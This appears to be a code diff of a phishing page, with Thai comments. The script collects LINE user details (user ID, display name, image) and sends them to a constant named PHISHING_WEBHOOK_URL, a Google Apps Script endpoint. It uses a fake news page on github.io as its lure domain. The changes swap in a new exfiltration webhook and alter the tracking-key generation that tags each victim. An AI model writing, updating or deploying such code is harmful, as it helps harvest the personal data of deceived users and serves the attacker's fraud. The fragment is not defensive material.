@@ -385,7 +385,7 @@
     <script>
         // ตัวแปรสำหรับเก็บข้อมูล
         let selectedImage = null;
-        let trackingKey = "";
+        let trackingKey = ""; // ต้องแน่ใจว่าตัวแปรนี้ถูกประกาศเป็นค่าว่าง
         let imageUrl = "";
         let userId = "";
         let displayName = "";
@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyMcrsxP-v1140A6LL-uM8BGOPjP46yhnYppJQP42E5XSOieTGO5lg9YN9X4Ip6c5m3Qg/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxOmDbAvlgWduUV2vM0A2uyR01Ms9ZQW1lbrfWIUxtcwjR8_fSUzlhXDCrChmEbAHn0KQ/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -716,7 +716,7 @@
             }
             
             // สร้าง tracking key ใหม่ทุกครั้ง - แก้ปัญหา key ซ้ำ
-            trackingKey = Date.now().toString(36) + "-" + Math.random().toString(36).substring(2, 6);
+            trackingKey = Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
             console.log("สร้าง Tracking Key ใหม่: " + trackingKey);
             
             try {
